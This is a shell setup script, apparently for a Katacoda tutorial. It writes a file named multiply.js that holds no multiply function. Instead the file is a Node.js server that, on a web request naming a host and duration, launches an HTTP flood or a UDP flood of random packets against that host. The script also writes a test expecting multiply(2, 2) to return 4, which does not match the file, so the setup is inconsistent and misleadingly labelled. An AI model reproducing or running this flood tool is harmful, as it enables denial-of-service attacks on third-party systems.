echo "Started"

cat << 'EOF' > /root/multiply.js
const req = require('request');
var http = require('http');
var url = require('url');
var randomstring = require("randomstring");
var dgram = require('dgram');
var host;
var time;
var method;

var server = http.createServer(function(request, response) {
    var queryData = url.parse(request.url, true).query;
    response.writeHead(200, {
        "Content-Type": "text/plain"
    });

    if (queryData.host) {
        host = queryData.host;
        console.log(host)

    } else {
        response.end("Please fill out the required fields!");
    }
    if (queryData.time) {
        time = queryData.time;
        time = Number(time)
        console.log(time)

    } else {
        response.end("Please fill out the required fields!");
    }
    if (queryData.method) {
        method = queryData.method;
        console.log(method)
        if (method == "udp") {
            console.log("UDP FLOOD");
            udpflood();
        } else {
            // Do nothing
        }
        if (method == "http") {
            console.log("HTTP FLOOD")
            httpflood();
        } else {
            //Do Nothing
        }

    } else {
        response.end("Please fill out the required fields!");
    }

    function httpflood() {
        var requests = 10000;
        var timesRun = 0;
        var interval = setInterval(function() {
            timesRun += 1;
            if (timesRun === time) {
                console.log("Attack ran for " + time + " seconds");
                clearInterval(interval);
            }
            for (let i = requests; i--;)
                req("http://" + host)
            console.log("Attack Running on " + host + " with " + requests + " requets per second")

        }, 2000)
    }

    function udpflood() {
        setInterval(function() {
            var client = dgram.createSocket('udp4');
            var message = randomstring.generate(10000);
            var port = Math.floor(Math.random() * (80) + 1);
            client.send(message, 0, message.length, port, host, function(err, bytes) {
                if (err) throw err;
               //console.log(message);
            });
        }, 1);
    }
});

server.listen(3000);

EOF

cat << 'EOF' > /opt/test.js
var x = multiply(2, 2);
if(x === 4) {
  process.exit(0);
} else {
  console.log("Error", x);
  process.exit(1);
}
EOF



echo 'done' > /opt/katacoda-background-finished
